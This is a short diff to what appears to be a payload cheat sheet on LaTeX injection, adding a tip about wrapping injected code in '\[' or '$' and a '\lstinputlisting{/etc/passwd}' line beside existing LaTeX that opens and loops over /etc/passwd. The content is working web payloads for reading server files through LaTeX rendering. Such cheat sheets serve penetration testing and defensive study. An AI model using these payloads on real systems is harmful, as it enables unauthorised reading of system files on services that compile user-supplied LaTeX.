@@ -1,5 +1,7 @@
 # LaTex Injection
 
+You might need to adjust injection with wrappers as `\[` or `$`.
+
 ## Read file
 
 Read file and interpret the LaTeX code in it:
@@ -22,6 +24,7 @@ Read single lined file:
 Read multiple lined file:
 
 ```tex
+\lstinputlisting{/etc/passwd}
 \newread\file
 \openin\file=/etc/passwd
 \loop\unless\ifeof\file
